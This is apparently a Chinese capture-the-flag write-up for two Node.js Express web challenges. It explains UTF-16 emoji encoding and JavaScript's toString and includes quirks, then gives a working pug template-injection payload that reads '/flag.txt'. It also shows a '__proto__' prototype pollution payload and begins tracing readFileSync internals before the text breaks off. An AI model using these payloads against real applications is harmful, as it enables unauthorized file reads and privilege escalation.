class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pugjs=<span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">admin=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;😍😂😍😒😘💕😁🙌&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;legend of zelda : tears of kingdom&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;if you want flag .then go to /admin ,and find a way to get it . no pain, no gain !&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>)</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> username=req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">var</span> password=req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="keyword">if</span>(username||password)&#123;</span><br><span class="line">        <span class="keyword">if</span>(username.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>))&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;you not the true admin&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(username.<span class="title function_">toString</span>().<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">2</span>)===admin.<span class="property">username</span>.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">2</span>)&amp;&amp;password===admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">15</span>))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">                req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:username,<span class="string">&#x27;isadmin&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:username&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;please enter usrname or password&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isadmin</span>===<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> hello=<span class="string">&#x27;welcome &#x27;</span>+req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">username</span></span><br><span class="line"></span><br><span class="line">        res.<span class="property">send</span> (pugjs.<span class="title function_">render</span>(hello))</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;8080&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:8080`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>大概是三个要点，一是 <strong>JavaScript</strong> 对
+<strong>emoji</strong> 字符的编码。</p>
+<h2 id="编码">编码</h2>
+<p><strong>JavaScript</strong> 采用的是 <strong>Unicode</strong>
+字符集，<strong>UTF-16</strong> 编码，因此对于一个
+<strong>emoji</strong> 字符来说，其在 <strong>JavaScript</strong>
+中表示的长度为 <strong>2</strong>。</p>
+<p>其中 <strong>charCodeAt</strong> 方法返回一个介于
+<strong>0-65535</strong> 之间的整数，表示给定索引处的
+<strong>UTF-16</strong> 代码单元。</p>
+<p>而 <strong>codePointAt</strong> 方法返回一个非负整数，表示
+<strong>Unicode</strong> 码点。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> emoji = <span class="string">&quot;😍&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(emoji.<span class="property">length</span>) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> emoji) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(emoji[i].<span class="title function_">charCodeAt</span>(<span class="number">0</span>))&#125; <span class="comment">// 55357 56845</span></span><br><span class="line"></span><br><span class="line">emoji.<span class="title function_">codePointAt</span>(<span class="number">0</span>) <span class="comment">// 128525</span></span><br></pre></td></tr></table></figure>
+<h3 id="unicode">Unicode</h3>
+<p><strong>Unicode</strong> 字符集目前分了 <strong>17</strong>
+个区，最前面的 <strong>65536</strong> 个字符在基本平面<strong>（BMP,
+Basic Multilingual Plane）</strong>, 码点范围 <strong>U+0000 -
+U+FFFF</strong>。剩余的字符都在辅助平面<strong>（SMP, Supplementary
+Multilingual Plane）</strong>，有 <strong>16</strong> 个，码点范围
+<strong>U+010000 - U+10FFFF</strong>。<strong>emoji</strong>
+字符都在辅助平面，在解析的时候，可以使用 <strong>U+200D</strong>
+零宽连字符，将两个 <strong>emoji</strong> 连起来，使其看起来像是一个
+<strong>emoji</strong>，不支持的系统会忽略零宽连字，直接显示多个
+<strong>emoji</strong> 字符。</p>
+<h3 id="utf-16">UTF-16</h3>
+<p>对于 <strong>Unicode</strong> 来说，<strong>U+D800 - U+DFFF</strong>
+是保留的码位区间。而 <strong>UTF-16</strong>
+便使用这个区间来对辅助平面的字符进行编码，其将区间 <strong>U+D800 -
+U+DBFF</strong> 划为高位 <strong>H</strong>，<strong>U+DC00 -
+U+DFFF</strong> 划为低位 <strong>L</strong>，有以下公式。</p>
+<p><span class="math display">\[
+\mbox{}H = Math.floor((C-\mbox{0x10000}) / \mbox{0x400})+\mbox{0xD800}
+\]</span></p>
+<p><span class="math display">\[
+L = (C - \mbox{0x10000})\ mod\ \mbox{0x400} + \mbox{0xDC00}
+\]</span></p>
+<p>代入上文 <strong>codePointAt</strong> 返回的
+<strong>128525</strong>，可以分别得到 <strong>charCodeAt</strong>
+先后打印的值 <strong>55357、56845</strong>。</p>
+<p>因此当遇到第一个字符【头两个字节】的码点在 <strong>U+D800 -
+U+DBFF</strong> 区间【高位
+<strong>H</strong>】上的时候，就需要和后一个字符【后两个字节】连着解码。</p>
+<h2 id="tostring">ToString</h2>
+<h3 id="数字类型">数字类型</h3>
+<p>十进制数转换为字符串：将数字对象的 <strong>toString()</strong>
+方法应用于数字，可以指定要转换的进制作为可选参数。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">var</span> str = number.<span class="title function_">toString</span>(); <span class="comment">// 默认转换为十进制</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// 42</span></span><br></pre></td></tr></table></figure>
+<p>其他进制转换为字符串：指定要转换的进制作为
+<strong>toString()</strong> 方法的参数。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">var</span> str = number.<span class="title function_">toString</span>(<span class="number">16</span>); <span class="comment">// 转换为十六进制</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// 2a</span></span><br></pre></td></tr></table></figure>
+<h3 id="字符串类型">字符串类型</h3>
+<p>字符串对象的 <strong>toString()</strong> 方法返回字符串自身。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> result = str.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// Hello</span></span><br></pre></td></tr></table></figure>
+<h3 id="布尔类型">布尔类型</h3>
+<p>布尔对象的 <strong>toString()</strong>
+方法返回布尔值的字符串表示。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bool = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> result = bool.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+<h3 id="数组类型">数组类型</h3>
+<p>数组对象的 <strong>toString()</strong>
+方法将数组的所有元素转换为字符串，并用逗号分隔。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> result = arr.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 1,2,3</span></span><br></pre></td></tr></table></figure>
+<h2 id="includes">includes</h2>
+<p>在 <strong>JavaScript</strong> 中，<strong>includes()</strong>
+方法用于检查数组或字符串中是否包含指定的元素或子字符串，并返回相应的布尔值。</p>
+<h3 id="字符串类型-1">字符串类型</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">includes</span>(<span class="string">&quot;World&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">includes</span>(<span class="string">&quot;Hi&quot;</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
+<h3 id="数组类型-1">数组类型</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="number">3</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="number">6</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
+<p>以及对于数组类型还有如下结果。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="string">&#x27;ad&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array = [<span class="string">&#x27;admin&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
+<h2 id="结论">结论</h2>
+<p>因为 <strong>/admin</strong> 路由中是当
+<strong>isadmin==='1'</strong> 的时候，才去获取
+<strong>username</strong> 传入的参数，使用 <strong>render</strong>
+方法解析。</p>
+<p>那么结合上文引入的 <strong>ejs</strong> 和 <strong>pug</strong>
+可以猜测是一个 <strong>ejs</strong> 模板引擎注入。</p>
+<p>而要给 <strong>req.session.user.username</strong> 传参，需要满足
+<strong>/login</strong> 中的登录条件。</p>
+<p>结合上述 <strong>toString</strong> 和 <strong>includes</strong>
+方法的一些特性，可以不难得出 <strong>username</strong> 传入数组形式的
+<strong>payload</strong> 的结论。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;username&quot;</span>: [<span class="string">&quot;ad#&#123;global.process.mainModule.constructor._load(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;)&#125;&quot;</span>]</span><br></pre></td></tr></table></figure>
+<p>这样对于 <strong>username.includes('ad')</strong>
+可以绕过，因为传入的不是 <strong>["ad"]</strong>，而
+<strong>toString</strong> 后获得的字符串也是以 <strong>ad</strong>
+开头。</p>
+<p>接下来是对 <strong>admin.password.substring(1,15)</strong>
+的绕过。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">15</span>).<span class="title function_">charCodeAt</span>(<span class="number">0</span>).<span class="title function_">toString</span>(<span class="number">16</span>)) <span class="comment">// de0d</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">15</span>).<span class="title function_">charCodeAt</span>(<span class="number">13</span>).<span class="title function_">toString</span>(<span class="number">16</span>)) <span class="comment">// d83d</span></span><br></pre></td></tr></table></figure>
+<p>得到头尾半个 <strong>Unicode</strong> 编码的 <strong>emoji</strong>
+字符。</p>
+<p>最后构造 <strong>payload</strong>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;ad#&#123;global.process.mainModule.constructor._load(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;)&#125;&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;\ude0d😂😍😒😘💕😁\ud83d&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="pollution">pollution</h1>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> expres = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">JSON</span>5 = <span class="built_in">require</span>(<span class="string">&#x27;json5&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> rand = <span class="built_in">require</span>(<span class="string">&#x27;string-random&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = <span class="title function_">rand</span>(<span class="number">32</span>, <span class="string">&#x27;0123456789abcdef&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">80</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">expres</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="variable constant_">SECRET</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;<span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span>&#125;</span><br><span class="line">&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">obj, arr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> verify = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj).<span class="title function_">forEach</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr.<span class="title function_">indexOf</span>(key) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            verify = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> verify;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;hellllllo!&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> userinfo = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">const</span> user = <span class="title class_">JSON</span>5.<span class="title function_">parse</span>(userinfo)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">waf</span>(user, [<span class="string">&#x27;admin&#x27;</span>])) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = user</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">admin</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;login success!&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;login error!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/dosometing&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>.<span class="property">file</span>).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">            req.<span class="property">body</span>.<span class="property">file</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(req.<span class="property">body</span>.<span class="property">file</span>)</span><br><span class="line">        res.<span class="title function_">send</span>(flag.<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/for_check&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/app/app.js&#x27;</span>).<span class="title function_">toString</span>())</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>原型链污染比较简单。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>__proto__<span class="punctuation">:</span> <span class="punctuation">&#123;</span>admin<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>读文件需要细究一下 <strong>readFileSync</strong>。</p>
+<h2 id="readfilesync">readFileSync</h2>
+<p>调用栈如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getPathFromURLPosix(), url:1467</span><br><span class="line">fileURLToPath(), url:1488</span><br><span class="line">toPathIfFileURL(), url:1567</span><br><span class="line">__node_internal_(), utils:687</span><br><span class="line">openSync(), fs:592</span><br><span class="line">readFileSync(), fs:468</span><br></pre></td></tr></table></figure>
+<p>首先是调用 <strong>openSync</strong> 方法。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readFileSync</span>(<span class="params">path, options</span>) &#123;</span><br><span class="line">  options = <span class="title function_">getOptions</span>(options, &#123; <span class="attr">flag</span>: <span class="string">&#x27;r&#x27;</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> isUserFd = <span class="title function_">isFd</span>(path); <span class="comment">// File descriptor ownership</span></span><br><span class="line">  <span class="keyword">const</span> fd = isUserFd ? path : fs.<span class="title function_">openSync</span>(path, options.<span class="property">flag</span>, <span class="number">0o666</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>openSync</strong> 中会用 <strong>getValidatedPath</strong>
+对路径的合法性进行校验。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">openSync</span>(<span class="params">path, flags, mode</span>) &#123;</span><br><span class="line">  path = <span class="title function_">getValidatedPath</span>(path);</span><br><span class="line">  <span class="keyword">const</span> flagsNumber = <span class="title function_">stringToFlags</span>(flags);</span><br><span class="line">  mode = <span class="title function_">parseFileMode</span>(mode, <span class="string">&#x27;mode&#x27;</span>, <span class="number">0o666</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ctx = &#123; path &#125;;</span><br><span class="line">  <span class="keyword">const</span> result = binding.<span class="title function_">open</span>(pathModule.<span class="title function_">toNamespacedPath</span>(path),</span><br><span class="line">                              flagsNumber, mode,</span><br><span class="line">                              <span class="literal">undefined</span>, ctx);</span><br><span class="line">  <span class="title function_">handleErrorFromBinding</span>(ctx);</span><br><span class="line">  <span 